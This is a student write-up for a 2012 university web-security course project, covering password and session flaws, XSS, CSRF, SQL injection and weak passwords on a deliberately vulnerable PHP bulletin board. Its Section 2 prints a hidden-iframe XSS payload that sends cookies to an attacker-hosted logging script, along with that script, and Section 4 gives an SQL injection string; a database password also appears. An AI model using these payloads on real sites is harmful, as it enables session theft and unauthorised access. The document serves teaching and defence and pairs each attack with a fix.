\documentclass[]{article}
\usepackage[utf8]{inputenc}
\usepackage{fullpage}

\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{latexsym}
\usepackage{alltt}
\usepackage{upquote}

\usepackage{boxedminipage}
\usepackage{listings}
\usepackage{minitoc}
\usepackage{ifpdf}

\title{CS 526 Information Security \\\textbf{Project 1 - Web
    Security\\
Cory Nguyen \& Josh Reese}}

\date{Due 15 October, 2012}
\begin{document}

\maketitle

In this project, you will perform a series of attacks to exploit some
vulnerabilities in an online bulletin-board, called
\emph{hackme}. Your attack will consist of several phases. You will
conduct cross site scripting, cross site request forgery, and SQL
injection attacks. You are also required to implement modifications to
the web site to prevent such attacks. 

\section*{Instructions}

\paragraph{Due date \& time} 11:59pm on October 15, 2012. Email your solutions to the TA (gates2@purdue.edu) by the due time. The file you submit must be compressed to a single archive (.zip or .tar)

\paragraph{Late Policy} You have three extra days in total for all your homework assignments and projects. Any portion of a day
used counts as one day; that is, you have to use integer number of late days each time. If you emailed your
homework to the TA by 11:59pm the day after it is due, then you have used one extra day. If you exhaust
your three late days, any late project won’t be graded.

\paragraph{Additional Instructions}

\begin{itemize}
	\item You are allowed to work in pairs of two.
	\item For this project, you need to download the source files for the website \emph{hackme}. The files are available from:\\
	\verb"http://forest.cs.purdue.edu/cs526_project1.tar"
	\item Each student will be given an account on \verb"forest.cs.purdue.edu". If you have not received an email with your account username/password, then email the TA.
	\item Your home account will contain a folder called \verb"public_html". This is your website's home directory, which you can use for testing your solution. You can access any file placed there online at: \verb"http://forest.cs.purdue.edu/~username/" 
	(remember to keep your permissions appropriate, you may need to modify them so that the group `www-data' has read and execute access)
	\item To set up your own version of the website, untar \verb"cs526_project1.tar" to the web directory above
	\item All your website instances will connect to the same mySQL database. The database name is \verb'cs526p1', the username to access the database is \verb'cs526f12' and the password is \verb"$troNg_PasSWord!". 
	\item Any code you write should run on \verb"forest" with no errors.
	\item The written portion of the project must be typed. Using Latex is recommended, but not required. The submitted document must be a PDF (no doc or docx are allowed)
\end{itemize}

\newpage 
{\bf \LARGE Preface}\\
For convenience the software solutions to each problem have been
separately packaged into directories following the titling scheme:
cs526\_x where x represents the number of the questions. In this way
each site can be viewed separately and the various fixes can be easily
verified.

\section{(25 pts) Password and Session Management}

Securely managing sessions and passwords is vital to prevent a number
of attacks on a webpage. Most website designers, however, neglect to
take a few important security measures when dealing with passwords and
cookies. In this part, you are going to explore hackme's code and
identify a set of exploitable vulnerabilities. 

\begin{enumerate}
\item \textbf{Password Management} hackme manages passwords in
  an inherently insecure way. Familiarize yourself with the
  password management techniques employed by hackme by
  examining the following files: \verb"index.php",
  \verb"register.php", and \verb"members.php": 
  \begin{itemize}
  \item \textbf{Describe} the password management system used by
    hackme. Include in your description how the passwords are stored,
    transmitted and authenticated.
    \begin{itemize}
    \item In this system passwords are stored as part of a users entry in
      the cs526pl database served from the localhost. A users password,
      upon login (or registration), is sent unencrypted to the server
      where it is hashed using the sha256 algorithm and checked
      against the stored hashed password for that user (for login) or
      stored in a new record for that user in the database (for
      registration). A users password is authenticated in the
      members.php file where it is hashed and compared to the value
      stored in the database for the specified user.
    \end{itemize}
  \item Hackme allows weak passwords of small
    length. Furthermore, it does not require
    passwords to be changed frequently. It also
    does not block a user after a number of
    failed login attempts. \textbf{Identify} and
    \textbf{describe} \textbf{two} \emph{other}
    vulnerabilities in the password management
    system. Include in your description a
    precise explanation of the vulnerability and
    \textbf{how} it can be exploited.\\
    \begin{enumerate}
      \item A passwords unadulterated hash values is stored in the
        local database. This opens the system up to a few attacks
        which can retrieve a users password. The first are dictionary
        and brute force attacks. If an attacker were able to get the
        hash of a users password they would be able to try various
        dictionary attacks and common passwords to attempt to recover
        the users password. This could be accomplished with lookup
        tables created by the attacker. In addition to this since all
        of the passwords are stored this way if an attacker were able
        to penetrate the database they could create a reverse lookup
        table and use common passwords to find any user in the system
        with that password.
      \item Passwords hash values are stored as the cookie value for a
        cookie when a user logs in. This opens the user up to the
        direct hash value of their password being stolen via XSS or
        any other attack which can steal a users current cookies. 
    \end{enumerate}
  \item \textbf{Describe} and \textbf{implement} techniques to fix the
    above vulnerabilities. Your description should be thorough and
    should indicate which files/scripts need modification and how they
    should be modified. You should then write code to fix the
    vulnerabilities. Your code will be graded on how well it fixes the
    vulnerabilities. You will not get any points for code that gives
    runtime errors.
    \begin{itemize}
    \item To fix the vulnerability described in (a) we implement a method
      by which the hash value stored in the database is not the direct
      hash of the users password. To accomplish this we modified
      register.php to use php's
      \emph{mcrypt\_create\_iv()} function to create a 16 byte IV
      value. This value is concatenated to the beginning of the users
      password prior to hashing. This IV value and hashed password are
      then stored in the database and can later be used to check for
      a valid user during login.

      \item In order to fix (b) we simply no longer store the password value
      as a cookie during user login. 
    \end{itemize}
  \end{itemize}
\item \textbf{Session Management} hackme relies on cookies to manage
  sessions. Familiarize yourself with the how cookies are managed in
  hackme. 
  \begin{itemize}
  \item \textbf{Describe} how cookies are used in hackme and how
    sessions are maintained. Include in your description what is
    stored in the cookies and what checks are performed on the
    cookies.
    \begin{itemize}
      \item There are two cookies managed by the hackme system named
        hackme and hackme\_pass which store, respectively, as values a
        users username and hashed password once logged in. When a user
        attempts to access members.php a check is made to see whether
        or not the hackme cookie is set. If this cookie is set the
        page is displayed, otherwise, the user is asked why they
        aren't logged in. Sessions are maintained through the hackme
        cookie as well. When each new page is visited a check is made
        to see if this cookie is set. The only checks made throughout
        the system are to whether or not the hackme cookie is set,
        regardless of the value to which it is set.
    \end{itemize}
  \item \textbf{Identify} and \textbf{describe} \textbf{three}
    vulnerabilities in the cookie management system or attacks that
    can be conducted. Include in your description a precise
    explanation of the vulnerability and \textbf{how} it can be
    exploited.
    \begin{enumerate}
      \item Firstly, since the value of the hackme cookie is never
        checked a user can create a cookie with the name hackme and is
        able to log into the site. From here they can see all the
        users who post to the site and change their cookie value to
        anyone's name, thus allowing them to post under a different
        user. This was accomplished in our testing by simply creating
        cookies in Firefox.
      \item A users hashed password value is stored directly in a
        cookie. This allows malicious attackers direct access to a
        users hashed password value therefore opening up the site to
        the attacks mentioned earlier. In addition to this since the
        hashed password is easily available to an attacker (using XSS
        or other methods) they would be able
        to perform all the mentioned attacks offline, thus preventing
        the site from presenting any defenses against multiple
        attempts to guess a password.
      \item Cookies are maintained even after the site is closed. This
        means that unless the user clicks the 'logout' button their
        cookies will remain on the system for at least an hour. This
        gives an attacker a much larger chance of being able to steal
        a users cookies since most users will probably forget to click
        'logout' and will continue browsing with these cookies still
        on their system. 
    \end{enumerate}
  \item \textbf{Describe} and \textbf{implement} techniques to fix the
    above vulnerabilities. Your description should be thorough and
    should indicate which files/scripts need modification and how they
    should be modified. You should then write code to fix the
    vulnerabilities. Your code will be graded on how well it fixes the
    vulnerabilities. You will not get any points for code that gives
    runtime errors.
    \begin{itemize}
      \item To fix this we removed cookie management altogether. In
        order to accomplish sessions we use the php superglobal
        \$\_SESSION. When a user is successfully logged in a value for
        \$\_SESSION['username'] is set. This value is then checked
        whenever a new page is loaded. In this way only a user who has
        successfully filled out the username and password login
        portion will be able to access any pages in the system. This
        also doesn't present any information publicly that can be used
        by attackers. To accomplish this the following files were
        modified to check for the \$\_SESSION variable being set as
        opposed to the hackme cookie being set: members.php,
        logout.php, post.php, and show.php.
    \end{itemize}
  \end{itemize}
\item Are phishing attacks possible on a webpage like hackme? If yes,
  explain why and describe a method of mitigating their effect. If no,
  explain why and describe specific security measures that are used in
  the webpage to prevent these attacks or mitigate their effect.\\
  \begin{itemize}
    \item In some sense they are possible but in others not quite as
      feasible. What is meant by this is an attacker can easily pose
      as a valid user and obtain information about other users. This
      is done by creating a fake cookie and entering the system
      unauthorized. This allows an attacker, who is unauthorized, to
      obtain usernames of people registered with the site. However,
      this is really all he is able to obtain. The reason for this is
      Hackme offers no type of password resetting mechanism, or
      'forgotten password' functionality. The lack of these functions
      actually helps Hackme in protection against password phishing attacks.
  \end{itemize}
  
\end{enumerate}

\section{(20 pts) XSS Attack}

Cross Site Scripting (XSS) attacks are one of the most common attacks
on websites and one of the most difficult to defend against. Popular
websites, including Facebook, were once vulnerable to such
attacks. Naturally, hackme is also vulnerable to XSS. In this part,
you will perform XSS attacks to steal users' cookies. 

\begin{enumerate}
\item Craft a special input string that can be used as part of
  a posting to the bulletin board to conduct a XSS attack. The
  attack should steal the cookies of any user who views your
  posting. The cookies must be stored in a file on the
  attacker's server (not storing the cookies will only get you
  partial credit). You need to: 
  \begin{itemize}
  \item Provide the \emph{exact} input string
    you need to post to the webpage (I should be able to copy
    your string and paste it in order to replicate your
    attack). To get full credit, your attack must be
    completely hidden from the victim.
    \begin{itemize}
    \item
      \begin{alltt}
  <iframe frameborder=0 height=0 width=0 src=javascript:
  void(document.location="http://forest.cs.purdue.edu/
  ~cqnguyen/Stealer.php?cookie="+document.cookie)></iframe>
\end{alltt}
    \end{itemize}
  \item Explain what your string does and how it
    performs the attack. Also describe how the
    attacker can access the stolen cookies. Be
    precise in your explanation.
    \begin{itemize}
    \item The script is placed in an iframe with frameborder, height, and
      width = 0, this is to hide the script from visiting users that visit
      the post. The cookie grabbing script is set in the src attribute where
      it's instructed to send the cookie to the receiving page specified by
      the attacker to receive the cookie:\\
      src=javascript:void(document.location="http://forest.cs.purdue.edu/\~{}cqnguyen/Stealer.php?\\cookie="+document.cookie.
      The receiving page\\
      (i.e. http://forest.cs.purdue.edu/\~{}cqnguyen/Stealer.php) is placed on
      the attacker's server and formatted to receive the cookie and write
      the cookie along with the date/time stamp in the file called log.txt
      (i.e. http://forest.cs.purdue.edu/\~{}~cqnguyen/log.txt)
    \end{itemize}
  \item Provide any extra web pages, files,
    and/or scripts that are needed to conduct a
    successful attack. Provide a complete
    description of each item and its intended
    purpose. Include in your description the
    required linux/unix permission bits for each
    new file.
    \begin{itemize}
    \item To be able to write to file, the  log.txt permission mode
      should be set to 666, the Stealer.php page permission was set to 664
      
      \lstset{language=PHP, caption={Stealer.php}}
      \begin{lstlisting}
        <?php
        function logData()
        {
          $cookieLog="log.txt";
          $cookie = $_SERVER['QUERY_STRING'];
          $date=date ("F d Y G:i:s");
          $log=fopen("$cookieLog", "a+");
          
          if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i",
          $ipLog))
          fputs($log, "DATE{ : } $date | COOKIE:  $cookie <br>");
          else
          fputs($log, "DATE: $date | COOKIE:  $cookie \n\n");
          fclose($log);
        }
        logData();
        ?>
      \end{lstlisting}
    \end{itemize}
  \item Describe the exact vulnerability that
    made your attack possible.
    \begin{itemize}
    \item The vulnerability of the post.php page is that the text input
      into the form are not escaped therefore they are read by the browser
      as a scripting language and not as plaintext.
    \end{itemize}
  \end{itemize}
\item \textbf{Describe} \emph{and} \textbf{implement} a method to
  prevent this attack. Your description should be thorough and should
  indicate which files/scripts need modification and how they should
  be modified. You should then write code to fix the
  vulnerability. Your code will be graded on how well it fixes the
  vulnerability. You will not get any points for code that gives
  runtime errors.
\begin{itemize}
\item To prevent future XSS attacks on the forum,  the input text into
post are treated as plaintext and any special characters are escaped
using the following command: htmlspecialchars()

The fixed shown in the script is in the folder cs526\_2, changes are
made in the post.php file: only modification is the addition of the
following line:

\begin{lstlisting}
  mysql_query("INSERT INTO threads (username, title, message, date)
  VALUES('".$_COOKIE['hackme'].'",
  '".htmlspecialchars($_POST['title'], ENT_QUOTES, 'UTF-8')."',
  '".htmlspecialchars($_POST['message'], ENT_QUOTES,'UTF-8')."',
  '".time()."')")or die(mysql_error());
\end{lstlisting}
\end{itemize}
\end{enumerate} 

\section{(20 pts) XSRF Attack}

Cross Site Request Forgery (XSRF) attacks are malicious exploits which
allow unauthorized commands to be transmitted to a webpage on behalf
of a victim user. The attack can be used to perform unauthorized
transactions on the victim's behalf. In this part, you will perform a
XSRF attack to post an advertisement to the website without the user's
consent. While the user is still logged on to hackme, you need lure
him/her to a malicious webpage that runs the attack. 

\begin{enumerate}
\item Create a new webpage that runs the XSRF attack. The attack
  should post an advertisement for ``awesome free stuff!!''. You need
  to: 
  \begin{itemize}
  \item Describe the components of your webpage. Include a thorough
    description of the component performing the attack and explain
    \textbf{how} the attack is performed.
    \begin{itemize}
      \item The site consists of two parts: the hook to the site and
        the site itself. The hook is just a link that takes the user
        to the site which performs the attack. To perform the attack
        we use javascript to create a form which contains all the
        fields necessary to submit a post. This function is called
        when the page loads and since the header created in post.php
        is back to members.php the user won't actually go
        anywhere. The idea being that a user who would click on this
        would just assume it was a dead link. In this way a user may
        actually click on it several times and submit multiple
        advertisement postings. 
    \end{itemize}
  \item Make sure that the attack is completely stealthy (hidden from
    the victim). The victim should only visit/view the malicious
    website for the attack to work. Attacks which require user
    interaction or which are not hidden (ex: cause redirection) will
    only get partial credit. 
  \item Identify a method of luring the victim to visit your malicious
    website while he/she is logged into hackme.\\
    \begin{itemize}
      \item The method we have used to lure users to our attack is the
        claim that there is some important message from the
        administrators. This is likely to attract visitors to click
        the link because they will believe the information contained
        in the link is important and relevant to them.
    \end{itemize}
  \end{itemize}
\item Describe the specific vulnerabilit(ies) in hackme that allows
  XSRF attacks. Be precise in your description.
  \begin{itemize}
    \item The main vulnerability in hackme that allows XSRF attacks is
      that there is no verification a submission of the form required
      to post to the site came from a real person. This allows an
      attacker to directly mirror the form used for submission and
      hide this in any site. Since there is no check to make sure the
      form was actually submitted by a user the attacker is able to
      automatically submit the same form automatically.
  \end{itemize}
\item Describe \textbf{two} methods to prevent XSRF attacks on
  hackme. You need to be thorough in your description: mention
  \textbf{what} needs to be done, \textbf{how} to do it, and
  \textbf{why} it will prevent the attack.
  \begin{enumerate}
    \item Require a hidden field to be used for authentication in the
      post request. This value needs to be specific to the user and
      not something that can be predicted by the attacker. What this
      does is makes it such that an attacker can't replicate the
      values used in a form submission because one of them will be
      'random' and user specific.
    \item Another method of prevention is what's known as
      'Challenge-Response'\\
      (https://www.owasp.org/index.php/Cross-Site\_Request\_Forgery\_(CSRF)\_Prevention\_Cheat\_Sheet). This
      prevention measure uses tools such as a CAPTCHA or
      re-authentication. In this mechanism when a user is submitting a
      sensitive form they are required to fill in the box of a
      CAPTCHA or re-enter their password. In this way the server can
      verify that it is actually the user submitting the form and not
      some automated attacker.
  \end{enumerate}
\item Implement \textbf{one} of the defenses described above. Your
  code will be graded on how well it fixes the vulnerability. You will
  not get any points for code that gives runtime errors.
  \begin{itemize}
    \item For our solution we chose to use the reCAPTCHA version of
      CAPTCHA in order to validate user input. The user is required to
      submit a reCAPTCHA along with the form for validation.
  \end{itemize}
\end{enumerate}

\section{(20 pts) SQL Injection Attack}
For this part, you will use \begin{verbatim}
  http://forest.cs.purdue.edu/cs526private/ \end{verbatim} 
Note that this version uses a different database instance which uses
login credentials that are not available to you. 

In an attempt to limit access to this bulletin board, we added one
more verification step to the registration process. Now, only users
that have been given a secret access key can register as users. When
creating a new account, the user has to enter a secret key. The hash
of this key is checked against a stored hash. If it matches, then the
registration process continues normally. This is the only time the key
is checked. 

The TA has posted some very interesting information on this private
blog and you need to access this information. Unfortunately, the
secret key was not given to you, and you cannot register on this
website. For this attack, you will bypass this requirement by
performing an SQL injection attack. 

\begin{enumerate}
\item By crafting a special input string to one of the HTML forms, you
  need to perform an SQL injection attack to register a new user on
  the website. You need to: 
  \begin{itemize}
  \item Identify the webpage you are using for the attack
    (i.e. \verb"index.php" or \verb"register.php")
    \begin{itemize}
      \item index.php
    \end{itemize}
        
  \item Provide the \emph{exact} input to \emph{every} field on the
    webpage; this should include your attack string (I should be able
    to copy your string and paste it in order to replicate your
    attack). To get full credit, your attack should not return an SQL
    error.
\begin{itemize}
\item
\lstset{language=SQL, caption={Attack string}}
\begin{alltt}
username: admin'; INSERT INTO users(username,pass,fname,lname)
VALUES('cqnguyen',
'3b1062cf78d75207fd41d5a3739720a0d758bb888b16c6db7e12ed0bf26b76a8',
'Cory','Nguyen'); SELECT * FROM users WHERE username = 'a\\
password: a
\end{alltt}
\end{itemize}
  \item \textbf{Execute} the attack to register a new user. The
    username should be your purdue email id (ex: wqardaji). The first
    name and last name should be your name. The password can be
    anything. 
  \item Login with new username, and \textbf{post} something on the
    bulletin board. The title of the post should be your full name.
    \begin{itemize}
      \item Post is under the title: Cory Nguyen \& Josh Reese.
    \end{itemize}
  \end{itemize}
\item \textbf{Describe} \emph{and} \textbf{implement} a method to
  prevent the above SQL injection attack. Your description should be
  thorough and should indicate which files/scripts need modification
  and how they should be modified. You should then write code to fix
  the vulnerabilities. Your code will be graded on how well it fixes
  the vulnerabilities. You will not get any points for code that gives
  runtime errors.
  \begin{itemize}
    \item The members.php was modified and placed in the cs526\_4
      folder. The modification was made to parameterize the sql
      statement and in effect prevents injecting sql values directly
      into the command. This in turns prevent a SQL injection
      attack. The code below shows the implementation of a php
      prepared statement :
      \begin{lstlisting}
      // Connect to db create an instance $conn
      $conn = new PDO("mysql:host=localhost;dbname=cs526p1",
      "cs526f12", "\$troNg_PasSWord!");
      //php prepared sql statement
      $q = $conn-> prepare("SELECT * FROM USERS WHERE username =
      ?");
      //binding input to parameters
      $q -> execute(array($username));
      //setting input values to parameters
      $username = $_POST['username'];
      //set a count
      $count = 0;
      //count rows return for check in validation section of code
      while ($row = $q->fetch(PDO::FETCH_OBJ)){
        $count++;
      }
      //set count to $check2 to integrate with old code
      $check2 = $count;

      //password hash validation
      if ($passwordHash != $row->pass) {
        die('Incorrect password, please try again.');
      }
      \end{lstlisting}
  \end{itemize}
  
\item The way the secret key is handled is inherently
  insecure. \textbf{Describe} a more secure method of providing the
  extra authentication step. That is, assuming that an adversary
  \textbf{can} perform the SQL injection attack, how can you prevent
  him from logging in to the website?
  \begin{itemize}
    \item
      By implementing a 2 factor authentication system, this could
      help to prevent an invalid user from logging in, even with a
      successful  SQL Injection attack. In this example, the user upon
      successful authentication of their password and username, the
      user will be asked to type in a security Token read from an RSA
      SecurID Token or by having a smart card inserted into the
      current machine. This in effect allows the users only access to
      the system not only based on what they know, but also based on
      what they have. Consequently, even if the attacker was able to
      perform a successful SQL Injection attack, the attack will not
      be able to log in due to the second layer of security, because
      they do not have a valid token.
  \end{itemize}
\end{enumerate}

Note: You can assume that ``magic quotes'' are disabled in the php.ini
file by the system administrator. You cannot override this setting. 


\section{(15 pts) Weak Passwords}
For this part, you will use \begin{verbatim}
  http://forest.cs.purdue.edu/cs526private/ \end{verbatim} 
Note that this version uses a different database instance which uses
login credentials that are not available to you. 

As you can tell, hackme does not check the strength of a user's
passwords. The website only enforces the condition that passwords
should be non-empty. As a result, 100 users registered accounts with
very weak and/or common passwords. In this part, you will run a brute
force dictionary attack to recover the passwords. 

\begin{enumerate}
\item Read the paper ``Testing Metrics for Password Creation Policies
  by Attacking Large Sets of Revealed Passwords'' by Weir et al. (CCS
  2010). 
  \begin{itemize}
  \item Describe the current NIST standard for measuring the strength
    of passwords.
    \begin{itemize}
      \item The current standard adopted by the NIST uses information
        entropy to quantify the strength of a password. This idea was
        developed by Claude Shannon and takes form in the equation
        $$ H(x) = -\sum_{i=0}^{n}P(x_i)Log_{2}P(x_i) $$
        and is measured in bits. The NIST uses this idea and a set of
        rules to determine the entropy of a password, which they
        equate to the strength of
        said password. These rules include 4 bits of entropy for the
        first character, 2 bits per character for the next 7
        characters, 1.5 bits for the next 9, and 1 bit for characters
        21 and above. In addition 6 bits is awarded for the use of
        uppercase and lowercase characters as well as special
        characters, and another 6 points is awarded if the password
        management system does an extensive dictionary check to make
        sure the password is not present in the dictionary. This value
        is then translated into a score that measures the security
        provided by a password management system. This is done with
        the equation:
        $$ Chance\ of\ success\ = Number\ of\ allowed\ guesses /
        2^{H(x)} $$
        In this way the NIST can define standards in terms of the
        number of guesses it should take an attacker to guess a users
        password. 
    \end{itemize}
  \item Briefly outline why, according to the paper, the NIST standard
    is ineffective.
    \begin{itemize}
      \item This paper proposes two important reasons why this
        standard isn't an effective measure. The first of these states
        that it is questionable whether or not the calculation of
        $H(x)$ actually reflects the entropy of passwords in practical
        use. For example let's take two passwords: asdfjk and
        qlcngg. In the NIST standard these two passwords would have
        the same entropy value but the first is clearly a much more
        common password than the second. The first password being the
        first 6 characters on the home-row and the second being 6
        characters that appeared when I mashed the keyboard. Does it
        make sense that they would have the same entropy value when
        many more users will be using the first password? This leads
        to the second argument that the equations provided for the
        NIST levels only work if H(x) is a uniformly distributed
        space. However, this is most certainly not the case with user
        created passwords and this is shown through various
        experiments throughout the paper.
    \end{itemize}
  \item Based on your understanding, suggest a set of rules that can
    be employed by hackme to prevent ``weak passwords''
    \begin{itemize}
      \item There are several proposed methods for creating systems
        which enforce strong passwords presented in the paper. To help
        hackme prevent weak passwords I would employ 3 measures of
        security. First, I would require users to use passwords of a
        certain length, with mixed case, a number, and a special
        character. Though this is not a fix on its own it will at
        least weed out severely weak passwords. In addition to this I
        would employ what is termed in the paper a 'blacklist' of
        passwords. This would be a dictionary of commonly used
        passwords, commonly used words and number combinations, and so
        on. When creating a password those in this dictionary would be
        restricted from being used. Lastly, I would provide a feedback
        mechanism that alerts a user to the estimated strength of
        their password. One way to do this is presented in the paper
        where a grammar is build based on patterns found in previously
        analyzed passwords. If a users password was found to be less
        secure than they are comfortable with they would have the
        option to either create a new password and check its strength
        or have their password modified with random characters to
        improve its strength. With all of these mechanisms in place
        hackme could employ a system which would help ensure users
        passwords are, if nothing else, more secure than they are currently.
    \end{itemize}
  \end{itemize}
  
\item The file \verb"users.txt" contains a list of 100 users with weak
  passwords. You need to perform a \textbf{brute-force
    \emph{dictionary}} attack to recover these passwords. For this,
  you need to find a corpus of weak passwords (a number of them are
  available online).  
  
  You should output your result in a text file called
  \verb"username_pass.txt", where `username' is replaced by your
  group's username. Each line should correspond to one user. You need
  to output the username, followed by a tab, followed by the
  password. The users should be in the same order as they appear in
  \verb"users.txt". If you are unable to recover a password for one
  user, then output the username alone on that line. That is, I should
  be able to run \verb"diff" on your output and my answer file in
  order to get the number of incorrect answers you have. Failure to
  follow these rules will not get you any credit. 
	
  This part is worth 10 pts (i.e. 0.1 points per password) and points
  will be rounded up. That is, you only need to recover 91 passwords
  to get a full grade. If you recover all 100 passwords, you will get
  bonus points. Hint: No password is used twice. If you are missing a
  few passwords after your dictionary attack, think about bad password
  habits made by users.  
\end{enumerate}

\end{document}
